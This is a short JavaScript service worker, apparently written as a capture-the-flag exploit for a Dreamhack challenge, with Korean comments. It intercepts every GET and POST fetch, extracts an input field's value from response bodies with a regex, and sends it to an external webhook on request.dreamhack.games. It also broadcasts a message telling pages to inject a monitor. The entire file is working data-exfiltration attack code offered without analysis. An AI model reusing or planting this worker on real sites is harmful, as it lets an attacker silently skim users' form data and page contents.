  const WEBHOOK = 'https://rhjifzf.request.dreamhack.games';

  self.addEventListener('install', (e) => {
      self.skipWaiting();
  });

  self.addEventListener('activate', (e) => {
      self.clients.claim();
  });

  self.addEventListener('fetch', (event) => {
      // POST 요청 (form submit) 감시
      if (event.request.method === 'POST' || event.request.method === 'GET') {
          const url = new URL(event.request.url);

          // 원본 요청 처리
          event.respondWith(
              fetch(event.request).then((response) => {
                  // 응답 클론
                  const responseClone = response.clone();

                  // 응답 내용 읽기
                  responseClone.text().then((body) => {
                      // input 필드 값이 포함되어 있으면 추출
                      const match = body.match(/id="input"[^>]*value="([^"]*)"/);
                      if (match && match[1]) {
                          const flag = match[1];
                          // 웹훅으로 전송
                          fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag), {
                              mode: 'no-cors'
                          }).catch(() => {});
                      }
                  });

                  return response;
              })
          );
      } else {
          event.respondWith(fetch(event.request));
      }
  });

  // 페이지 로드 시 input 감시 스크립트 주입
  self.addEventListener('message', (event) => {
      if (event.data.type === 'CLAIM') {
          // 모든 클라이언트에 메시지 전송
          self.clients.matchAll().then((clients) => {
              clients.forEach((client) => {
                  client.postMessage({
                      type: 'INJECT_MONITOR',
                      webhook: WEBHOOK
                  });
              });
          });
      }
  });
